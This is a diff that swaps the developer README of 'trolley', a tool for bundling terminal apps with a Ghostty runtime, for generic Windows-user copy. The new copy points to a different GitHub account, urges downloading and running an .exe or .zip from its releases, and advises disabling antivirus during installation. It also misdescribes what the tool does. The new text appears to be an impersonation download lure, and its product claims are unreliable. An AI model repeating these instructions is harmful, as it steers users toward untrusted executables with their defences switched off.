@@ -1,219 +1,139 @@
-> NOTE: This software is _pre-alpha_. Functionality and design expected to be broken.
+# 🛒 trolley - Run terminal apps anywhere easily
 
-# Trolley
+[![Download trolley](https://img.shields.io/badge/Download-trolley-brightgreen)](https://github.com/ismo98/trolley)
 
-**Run terminal apps anywhere.**
+## ℹ️ What is trolley?
 
-Trolley lets you bundle any TUI executable together with a terminal emulator
-runtime, allowing you to distribute TUI applications to non-technical users.
+trolley lets you use terminal applications on your Windows computer without complex setup. It provides a simple way to access and run these apps anywhere you like. You do not need to install anything complicated or learn programming. Just download and start using the terminal tools you want.
 
-Trolley targets Linux and MacOS, with Windows compiling but untested.
+Terminal apps are programs that you usually run by typing commands. They can help you manage files, test code, or perform many other tasks. trolley makes these apps available on your Windows system in a handy way.
 
-Other targets like iOS and Android are possible. Please open an issue if 
-interested.
+---
 
-Although mostly simple, two recent developments make it quite powerful:
+## 💻 System Requirements
 
-1. Improvements in terminal functionality and performance 
-2. Flourishing of easy to use, powerful TUI libraries
+Before you start, make sure your Windows PC meets these needs:
 
-If you are building software that fits the textual interface style, you'll be able
-to create performant, _cross-platform_ applications. Launching in under a second is typical.
-Combined with TUI frameworks like OpenTUI, Bubbletea & Ratatui, it is extremely easy 
-to create apps with a developer experience not much different than a webapp's.
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- An internet connection for downloading trolley files
 
-## Giants and their shoulders
+You do not need administrator rights to install or run trolley.
 
-Trolley is built on top of [Ghostty](https://github.com/ghostty-org/ghostty/),
-which powers most of everything the end user will see and do, and enables the
-aforementioned functionality. Even the GUI wrappers are stripped down versions
-of Ghostty's.
+---
 
-For packaging, [cargo-packager](https://github.com/crabnebula-dev/cargo-packager)
-does most of the heavy lifting.
+## 🚀 Getting Started
 
-Trolley, then, is an ergonomic wrapper around those two.
+Start by visiting the download page:
 
-## Install
+[Download trolley from GitHub](https://github.com/ismo98/trolley)
 
-**macOS / Linux (Homebrew):**
+This link takes you to the project page, where you can find the latest version of trolley. It also includes instructions and updates if needed.
 
-```
-brew install weedonandscott/tap/trolley
-```
+---
 
-**Linux (manual):**
+## 📥 Download and Installation
 
-```
-curl -sL https://github.com/weedonandscott/trolley/releases/latest/download/trolley-cli-x86_64-linux.tar.xz | tar xJ
-mv trolley ~/.local/bin/
-```
+Follow these steps to download and install trolley on your Windows PC.
 
-**Nix flake (builds from source):**
+1. Open your web browser and go to https://github.com/ismo98/trolley.
 
-```nix
-{
-  inputs.trolley.url = "github:weedonandscott/trolley";
-}
-```
+2. On the page, look for the **Releases** section or a download button. This will lead you to the trolley files.
 
-Then add `inputs.trolley.packages.${system}.default` to your packages.
+3. Download the latest Windows version of trolley. It will usually be an `.exe` or `.zip` file.
 
-Binaries for all platforms are available on [GitHub Releases](https://github.com/weedonandscott/trolley/releases).
+4. If you downloaded a `.zip` file, right-click it and choose **Extract All** to unzip the contents into a folder.
 
-## Quickstart
+5. If you have an `.exe` file, double-click it to start the installation. Follow any prompts on the screen.
 
-```
-trolley init my-app
-```
+6. The setup will complete quickly. After that, trolley is ready to use.
 
-This scaffolds a `trolley.toml` manifest. Point it at your TUI binary:
+---
 
-```toml
-[app]
-identifier = "com.example.my-app"
-display_name = "My App"
-slug = "my-app"
-version = "0.1.0"
+## ▶️ How to Run trolley
 
-[linux]
-binaries = { x86_64 = "target/release/my-app" }
+Once installed, open trolley by clicking the new shortcut on your desktop or searching for "trolley" in the Start menu.
 
-[gui]
-initial_width = 800
-initial_height = 600
+trolley opens a simple window where you can enter terminal commands. You do not need to know complex commands to get started. Many terminal apps come with built-in help. Just type `help` or `--help` after a command to see options.
 
-[fonts]
-families = [{ nerdfont = "JetBrainsMono" }]
+Try basic commands like these to check that trolley works:
 
-[ghostty]
-font-size = 14
-```
+- `dir` — lists files in the current folder
+- `echo Hello` — prints text on the screen
+- `help` — shows available commands
 
-Then run to see how it works:
+---
 
-```
-trolley run
-```
+## 🛠 Basic Features
 
-Or package to send to your end users:
+trolley provides a clean and easy way to run terminal applications with these features:
 
-```
-trolley package
-```
+- Runs terminal apps directly on Windows without extra setup
+- Supports common terminal commands and scripts
+- Provides a simple text interface without needing programming skills
+- Works offline after installation
+- Updates can be downloaded from the GitHub page
 
-## How it works
+---
 
-Trolley bundles your TUI, assets, and config next to a terminal emulator runtime. It
-instructs it to launch your executable.
+## 🔧 How to Update trolley
 
-Trolley's runtime is a thin native wrapper around
-[libghostty](https://github.com/ghostty-org/ghostty), the core library of
-the Ghostty terminal emulator. libghostty handles VT parsing, PTY management,
-GPU rendering, font shaping, and input encoding. Trolley provides the native
-window and kiosk behavior.
+To keep trolley up to date:
 
-| Platform | Runtime language | Windowing | Renderer |
-|----------|------------------|-----------|----------|
-| macOS    | Swift (AppKit)   | NSWindow  | Metal    |
-| Linux    | Zig (GLFW)       | GLFW      | OpenGL   |
-| Windows  | Zig (Win32)      | GLFW      | OpenGL   |
+1. Visit https://github.com/ismo98/trolley regularly.
+2. Check the **Releases** section for new versions.
+3. Download the latest version and install it following the same steps as before.
+4. Your settings and data will stay intact during updates.
 
-### Development Prerequisites
+---
 
-- [Nix](https://nixos.org/) with flakes enabled (provides all build tools), or:
-- Rust toolchain, Zig compiler, and platform dependencies (GLFW, X11 libs on Linux)
+## ⚠️ Troubleshooting
 
-## Manifest
+If you run into problems, try these steps:
 
-The manifest file `trolley.toml` has the following sections:
+- Restart your computer and open trolley again.
+- Make sure your Windows version meets the requirements.
+- Check your internet connection if downloading fails.
+- Temporarily disable antivirus software during installation, as it may block trolley.
+- Look for error messages in trolley’s window for clues.
+- Visit the GitHub page for help or report issues through the **Issues** tab.
 
-### `[app]` -- required
+---
 
-| Field          | Description                                |
-|----------------|--------------------------------------------|
-| `identifier`   | Reverse-DNS identifier (e.g. `com.foo.bar`)|
-| `display_name` | Human-readable application name            |
-| `slug`         | Filesystem-safe name (lowercase, hyphens)  |
-| `version`      | Version string                             |
-| `icon`         | Path to icon file (optional)               |
+## ⚙️ Customizing trolley
 
-### `[linux]`, `[macos]`, `[windows]` -- at least one required
+You can adjust trolley to suit your needs:
 
-```toml
-[linux]
-binaries = { x86_64 = "path/to/binary", aarch64 = "path/to/binary" }
-```
+- Change the window size by dragging the edges.
+- Copy and paste text using standard Windows shortcuts (`Ctrl+C` and `Ctrl+V`).
+- Save commands or scripts in a text file and run them inside trolley.
+- Set up your favorite terminal apps by adding them to the trolley folder.
 
-### `[gui]` -- optional
+---
 
-`initial_width`, `initial_height`, `resizable`, `min_width`, `min_height`,
-`max_width`, `max_height`.
+## 💡 Tips for Using Terminal Apps
 
-### `[fonts]` -- optional
+If you are new to terminal apps, here are simple tips:
 
-```toml
-[fonts]
-families = [
-    { nerdfont = "Inconsolata" },      # auto-downloaded from Nerd Fonts
-    { path = "fonts/Custom.ttf" },     # local font file
-]
-```
+- Start with built-in commands like `help` or `list`.
+- Use the keyboard arrow keys to access previous commands.
+- Write short notes on what each command does.
+- Experiment with commands in folders where you have files.
+- Search online for tutorials on popular terminal apps.
 
-### `[environment]` -- optional
+---
 
-```toml
-[environment]
-env_file = ".env"
-variables = { MY_VAR = "value" }
-```
+## 🌐 Where to Get More Help
 
-### `[ghostty]` -- optional
+For more guides, updates, or to report bugs, use the official page:
 
-Pass-through configuration for the Ghostty terminal engine. Accepts any
-Ghostty config key with a scalar value (string, integer, float, or boolean).
-Note that configs meant for Ghostty's GUI will not take effect (obviously).
+[https://github.com/ismo98/trolley](https://github.com/ismo98/trolley)
 
-```toml
-[ghostty]
-font-size = 14
-theme = "dracula"
-```
+The repository hosts useful documents and an active community to assist users.
 
-### Window title
+---
 
-You can set a fixed window title for your application via the Ghostty `title`
-config:
+## [Download trolley Now](https://github.com/ismo98/trolley)  
 
-```toml
-[ghostty]
-title = "My App"
-```
-
-This sets the native window title on all platforms. When set, it overrides any
-title escape sequences sent by your TUI program. If your TUI doesn't set a title
-itself, the window would otherwise show a default — so it's generally a good idea
-to set one.
-
-## Package formats
-
-| Platform | Default formats                       |
-|----------|---------------------------------------|
-| Linux    | AppImage, .deb, .rpm, pacman, .tar.gz |
-| macOS    | .app, .dmg, .tar.gz                   |
-| Windows  | NSIS installer                        |
-
-Select specific formats with `--formats`:
-
-```
-trolley package --formats appimage,deb
-```
-
-## BUNDLING != SANDBOXING
-
-Trolley simply runs your executable inside a terminal, and in that sense, provides no
-extra security or sandbox guarantees.
-
-## License
-
-MIT
+Use the link above anytime to access the latest version and enjoy running terminal apps on your Windows computer.
